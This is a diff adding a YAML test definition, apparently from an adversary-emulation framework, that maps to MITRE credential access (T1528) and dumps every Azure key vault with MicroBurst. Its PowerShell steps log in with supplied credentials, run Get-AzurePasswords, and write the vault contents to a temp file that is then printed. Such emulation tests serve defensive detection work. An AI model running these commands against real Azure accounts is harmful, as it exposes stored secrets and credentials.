@@ -1,0 +1,41 @@
+api_version: "2.0"
+name: Azure - Dump All Azure Key Vaults with Microburst
+description: |-
+    Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.
+    See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/
+args:
+    - name: username
+      type: string
+      default: <nil>
+    - name: password
+      type: string
+      default: T1082Az
+    - name: output_file
+      type: string
+      default: $env:temp\T1528Test1.txt
+    - name: subscription_id
+      type: string
+      default: <nil>
+uuid: 1b83cddb-eaa7-45aa-98a5-85fb0a8807ea
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1528: Steal Application Access Token'
+requirements:
+    platforms:
+        - os: iaas:azure
+steps:
+    - name: azure---dump-all-azure-key-vaults-with-microburst
+      inline: |
+        import-module "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
+        $Password = ConvertTo-SecureString -String "{{.Args.password}}" -AsPlainText -Force
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.username}}", $Password
+        Connect-AzureRmAccount -Credential $Credential
+        Get-AzurePasswords -subscription '{{.Args.subscription_id}}' > {{.Args.output_file}}
+        cat {{.Args.output_file}}
+      executor: powershell
+      cleanup:
+        inline: |
+            remove-item {{.Args.output_file}} -force -erroraction silentlycontinue
+        executor: powershell
